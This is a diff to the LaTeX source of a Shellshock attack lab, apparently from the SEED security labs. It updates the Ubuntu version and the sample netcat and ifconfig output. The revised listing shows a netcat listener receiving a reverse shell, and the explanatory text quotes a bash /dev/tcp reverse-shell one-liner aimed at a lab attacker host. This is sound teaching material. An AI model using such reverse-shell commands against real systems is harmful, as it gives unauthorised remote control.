@@ -57,7 +57,7 @@ Detailed coverage of the Shellshock attack can be found in the following:
 \end{itemize}
 
 
-\paragraph{Lab environment.} \seedenvironment
+\paragraph{Lab environment.} \seedenvironmentB
 
 
 
@@ -74,7 +74,7 @@ Detailed coverage of the Shellshock attack can be found in the following:
 \subsection{Task 1: Experimenting with Bash Function}
 
 
-The Bash program in Ubuntu 16.04 has already been patched, so it is no
+The Bash program in Ubuntu 20.04 has already been patched, so it is no
 longer vulnerable to the Shellshock attack. For the purpose of this lab, we
 have installed a vulnerable version of Bash inside the \texttt{/bin}
 folder; its name is \texttt{bash\_shellshock}. We need to use 
@@ -268,15 +268,15 @@ to listen for a connection on port \texttt{9090}~(let us focus only on the first
 
 
 \begin{lstlisting}
-Attacker(10.0.2.6):$ nc -l 9090 -v  (*@\reflectbox{\ding{217}} \textbf{Waiting for reverse shell}@*)
-Connection from 10.0.2.5 port 9090 [tcp/*] accepted
+Attacker(10.0.2.6):$ nc -nv -l 9090  (*@\reflectbox{\ding{217}} \textbf{Waiting for reverse shell}@*)
+Listening on 0.0.0.0 9090
+Connection received on 10.0.2.5 39452
 Server(10.0.2.5):$     (*@\reflectbox{\ding{217}} \textbf{Reverse shell from 10.0.2.5.}@*)
 Server(10.0.2.5):$ ifconfig
 ifconfig
-eth23  Link encap:Ethernet  HWaddr 08:00:27:fd:25:0f
-       inet addr:(*@\textbf{10.0.2.5}@*)  Bcast:10.0.2.255  Mask:255.255.255.0
-       inet6 addr: fe80::a00:27ff:fefd:250f/64 Scope:Link
-       ...
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet (*@\textbf{10.0.2.5}@*)  netmask 255.255.255.0  broadcast 10.0.2.255
+        ...
 \end{lstlisting}
 
 
@@ -319,8 +319,8 @@ In summary, the command \texttt{"/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<\&1 2>\
 and output going to the same TCP connection.
 In our experiment, when the \texttt{bash}
 shell command is executed on \texttt{10.0.2.5}, it connects back to the \texttt{netcat} process
-started on \texttt{10.0.2.6}. This is confirmed via the \texttt{"Connection from 10.0.2.5 port
-9090 [tcp/*] accepted"} message displayed by \texttt{netcat}.
+started on \texttt{10.0.2.6}. This is confirmed via the \texttt{"Connection from 10.0.2.5 ..."} 
+message displayed by \texttt{netcat}.
 
 
 
